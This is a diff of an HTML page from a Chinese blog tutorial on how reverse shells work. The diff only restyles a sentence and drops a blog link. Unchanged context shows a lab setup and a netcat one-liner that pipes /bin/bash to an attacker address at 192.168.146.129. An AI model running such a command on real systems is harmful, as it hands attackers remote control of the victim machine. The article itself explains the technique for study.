@@ -357,7 +357,7 @@
 <p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
 <p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
 <p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
-<h2 id="0X03-反弹shell的本质是什么"><a href="#0X03-反弹shell的本质是什么" class="headerlink" title="0X03 反弹shell的本质是什么"></a><strong>0X03 反弹shell的本质是什么</strong></h2><p>我们可以先以一个linux 下的反弹shell 的命令为例来看一下反弹shell 的命令都做了些什么，掌握了反弹的本质，再多的方法其实只是换了包装而已。</p>
+<h2 id="0X03-反弹shell的本质是什么"><a href="#0X03-反弹shell的本质是什么" class="headerlink" title="0X03 反弹shell的本质是什么"></a><strong>0X03 反弹shell的本质是什么</strong></h2><p>我们可以先以一个linux 下的反弹shell 的命令为例来看一下反弹shell 的命令都做了些什么，<font color="#dd0000">掌握了反弹的本质，再多的方法其实只是换了包装而已。</font><br> </p>
 <p><strong>实验环境：</strong></p>
 <p><strong>受害者：</strong></p>
 <p>Ubuntu Linux ——&gt; 192.168.146.128</p>
@@ -454,7 +454,6 @@
 <p>类似的命令：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>
 <h2 id="0X05-总结"><a href="#0X05-总结" class="headerlink" title="0X05 总结"></a><strong>0X05 总结</strong></h2><p>反弹shell方法虽然常见，方法网上一搜就是一大把的代码，但是很少有人会去仔细斟酌反弹shell的原理，我也看到有类似的文章，但是可能是由于篇幅原因并没有对文件描述符和重定向的部分做深入的讨论，导致解释语句的时候依然让人不好理解，于是这次我分成了两篇有所关联的文章彻底的剖析了一下，个人认为这个原理是非常值得大家思考的，也很有趣，如果我的文章有什么地方有问题，希望大家及时联系我。</p>
-<p>个人博客： <a href="http://www.k0rz3n.com/" target="_blank" rel="noopener">http://www.k0rz3n.com</a></p>
 <h2 id="0X06-参考链接"><a href="#0X06-参考链接" class="headerlink" title="0X06 参考链接"></a><strong>0X06 参考链接</strong></h2><p><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a><br><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br><a href="https://blog.csdn.net/roler_/article/details/17504039" target="_blank" rel="noopener">https://blog.csdn.net/roler_/article/details/17504039</a><br><a href="http://www.freebuf.com/articles/system/153986.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/153986.html</a><br><a href="https://www.zhihu.com/question/24503813" target="_blank" rel="noopener">https://www.zhihu.com/question/24503813</a></p>
 
           
